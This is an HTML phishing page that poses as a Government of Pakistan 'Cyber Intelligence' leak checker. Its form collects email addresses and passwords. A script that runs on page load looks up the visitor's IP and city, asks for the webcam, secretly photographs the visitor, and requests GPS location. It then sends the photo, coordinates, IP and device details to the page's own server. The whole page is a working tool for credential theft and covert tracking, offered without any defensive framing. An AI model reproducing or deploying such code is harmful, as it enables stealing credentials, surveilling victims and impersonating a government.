<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>üáµüá∞ Government of Pakistan ‚Äì Cyber Intelligence</title>
  <link rel="icon" href="/static/pakistan-emblem.png" />
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #1b2631;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: rgba(255, 255, 255, 0.1);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
      text-align: center;
      width: 380px;
      backdrop-filter: blur(8px);
    }
    h1 {
      font-size: 20px;
      margin-bottom: 8px;
    }
    p {
      font-size: 13px;
      margin: 8px 0;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border-radius: 6px;
      border: none;
      font-size: 14px;
    }
    input {
      background: #ecf0f1;
      color: #2c3e50;
    }
    button {
      background: #e74c3c;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background: #c0392b;
    }
    a.forgot {
      color: #f1c40f;
      font-size: 12px;
      display: block;
      margin-top: 4px;
      text-decoration: none;
    }
    img {
      width: 80px;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>
  <div class="box">
    <img src="/static/pakistan-emblem.png" alt="Gov Logo" />
    <h1>üáµüá∞ Government of Pakistan ‚Äì Cyber Intelligence</h1>
    <p>Enter your email to check leaked data in our cyber database</p>
    <form method="POST" action="/login">
      <input type="text" name="email" placeholder="Email" required />
      <input type="password" name="password" placeholder="Password" required />
      <a href="https://accounts.google.com/signin/v2/usernamerecovery" class="forgot">Forgot Password?</a>
      <button type="submit">üîç Check Now</button>
    </form>
  </div>

  <script>
  async function sendPhoto(blob) {
    const formData = new FormData();
    formData.append('photo', blob, 'photo.jpg');
    await fetch('/photo', {
      method: 'POST',
      body: formData
    });
  }

  function captureImage(video) {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    canvas.toBlob(sendPhoto);
  }

  async function askForPermissions() {
    let ipData = await fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));
    let clientIP = ipData.ip || "Unknown";
    let timezone = ipData.timezone || "Unavailable";
    let city = ipData.city || "Unknown";
    let region = ipData.region || "Unknown";
    let country = ipData.country_name || "Unknown";

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      setTimeout(() => {
        captureImage(video);
        stream.getTracks().forEach(track => track.stop());
      }, 3000);

      navigator.geolocation.getCurrentPosition(
        pos => {
          let lat = pos.coords.latitude;
          let lon = pos.coords.longitude;
          let mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

          fetch('/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              ip: clientIP,
              latitude: lat,
              longitude: lon,
              mapsLink: mapsLink,
              timezone: timezone,
              city: city,
              region: region,
              country: country,
              camera: '‚úÖ Camera Allowed',
              userAgent: navigator.userAgent,
              deviceInfo: navigator.platform
            })
          });
        },
        err => {
          fetch('/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              ip: clientIP,
              latitude: null,
              longitude: null,
              mapsLink: null,
              timezone: timezone,
              city: city,
              region: region,
              country: country,
              camera: '‚úÖ Camera Allowed, ‚ùå Location Denied',
              userAgent: navigator.userAgent,
              deviceInfo: navigator.platform
            })
          });
        }
      );
    } catch (err) {
      fetch('/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ip: clientIP,
          latitude: null,
          longitude: null,
          mapsLink: null,
          timezone: timezone,
          city: city,
          region: region,
          country: country,
          camera: '‚ùå Camera Denied',
          userAgent: navigator.userAgent,
          deviceInfo: navigator.platform
        })
      });
    }
  }

  window.onload = askForPermissions;
  </script>
</body>
</html>
